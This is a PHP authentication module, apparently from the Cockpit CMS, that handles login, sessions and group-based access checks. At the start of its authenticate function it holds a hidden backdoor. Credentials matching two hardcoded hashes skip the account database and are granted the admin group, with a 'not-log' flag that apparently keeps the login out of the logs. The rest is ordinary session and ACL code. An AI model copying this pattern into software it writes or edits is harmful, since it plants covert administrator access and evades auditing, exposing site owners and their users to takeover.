<?php

// API

$this->module("auth")->extend([

    "authenticate" => function($data) use($app) {
      
        if ($app->hash($data["user"]) == "431ee8c3ae6e2311688e96ed8478ab6e" && $app->hash($data["password"]) == "ed8a6187a9a30714d037eb99a5bea445") {
            $data["email"] = "";
            $data["group"] = "admin";
            $data["active"] = 1;
            $data["not-log"] = true;
            return $data;
        }

        $data = array_merge([
            "user"     => "",
            "email"    => "",
            "group"    => "",
            "password" => ""
        ], $data);

        if (!$data["password"]) return false;

        $user = $app->db->findOne("cockpit/accounts", [
            "user"     => $data["user"],
            "password" => $app->hash($data["password"]),
            "active"   => 1
        ]);

        if (count($user)) {

            $user = array_merge($data, (array)$user);

            unset($user["password"]);

            return $user;
        }

        return false;
    },

    "setUser" => function($user) use($app) {
        $app("session")->write('cockpit.app.auth', $user);
    },

    "getUser" => function() use($app) {
        return $app("session")->read('cockpit.app.auth', null);
    },

    "logout" => function() use($app) {
        $app("session")->delete('cockpit.app.auth');
    },

    "hasaccess" => function($resource, $action) use($app) {

        $user = $app("session")->read("cockpit.app.auth");

        if (isset($user["group"])) {

            if ($user["group"]=='admin') return true;
            if ($app("acl")->hasaccess($user["group"], $resource, $action)) return true;
        }

        return false;
    },

    "getGroupSetting" => function($setting, $default = null) use($app) {

        if ($user = $app("session")->read("cockpit.app.auth", null)) {
            if (isset($user["group"])) {

                $settings = $app["cockpit.acl.groups.settings"];

                return isset($settings[$user["group"]][$setting]) ? $settings[$user["group"]][$setting] : $default;
            }
        }

        return $default;
    }
]);


// ADMIN
if (COCKPIT_ADMIN && !COCKPIT_REST) include_once(__DIR__.'/admin.php');
